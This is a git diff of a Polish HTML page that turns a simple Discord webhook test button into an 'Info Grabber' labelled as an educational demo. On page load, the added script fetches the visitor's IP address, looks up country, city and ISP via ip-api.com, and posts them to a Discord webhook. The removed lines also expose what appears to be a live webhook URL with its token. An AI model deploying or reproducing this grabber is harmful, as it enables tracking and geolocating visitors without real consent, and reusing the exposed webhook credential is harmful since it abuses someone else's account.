@@ -1,37 +1,43 @@
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-  <meta charset="UTF-8" />
-  <title>Test webhook Discord</title>
+    <meta charset="UTF-8">
+    <title>Info Grabber (Edukacyjny)</title>
 </head>
 <body>
-  <h1>Wyślij wiadomość na Discord webhook</h1>
-  <button id="sendBtn">Wyślij wiadomość</button>
+    <h1>Twój adres IP zostanie pokazany i wysłany na webhook (demo edukacyjne)</h1>
+    <p id="ip">Ładowanie IP...</p>
 
-  <script>
-    const webhookURL = "https://discord.com/api/webhooks/1390384590430146560/z0iZCQLPi6c-W8IZ3_Ryc4MZuBZbh6VlmoP-91fNAKVS1f6gndBfO6qsiT1LAFYEbVAF";
+    <script>
+        const webhook = "https://discord.com/api/webhooks/TUTAJ_TWÓJ_WEBHOOK";
 
-    document.getElementById("sendBtn").onclick = () => {
-      fetch(webhookURL, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          content: "Testowa wiadomość z przeglądarki!",
-        }),
-      })
-      .then(response => {
-        if (response.ok) {
-          alert("Wysłano pomyślnie!");
-        } else {
-          alert("Błąd wysyłania: " + response.status);
-        }
-      })
-      .catch(err => {
-        alert("Błąd: " + err);
-      });
-    };
-  </script>
+        fetch("https://api.ipify.org?format=json")
+            .then(res => res.json())
+            .then(data => {
+                const ip = data.ip;
+                document.getElementById("ip").innerText = `Twoje IP: ${ip}`;
+
+                fetch(`http://ip-api.com/json/${ip}`)
+                    .then(res => res.json())
+                    .then(location => {
+                        const embed = {
+                            "content": "",
+                            "embeds": [{
+                                "title": `Nowe wejście na stronę`,
+                                "description": `\`\`\`IP: ${ip}\nKraj: ${location.country}\nMiasto: ${location.city}\nISP: ${location.isp}\`\`\``,
+                                "color": 3447003
+                            }]
+                        };
+
+                        fetch(webhook, {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify(embed)
+                        });
+                    });
+            });
+    </script>
 </body>
 </html>
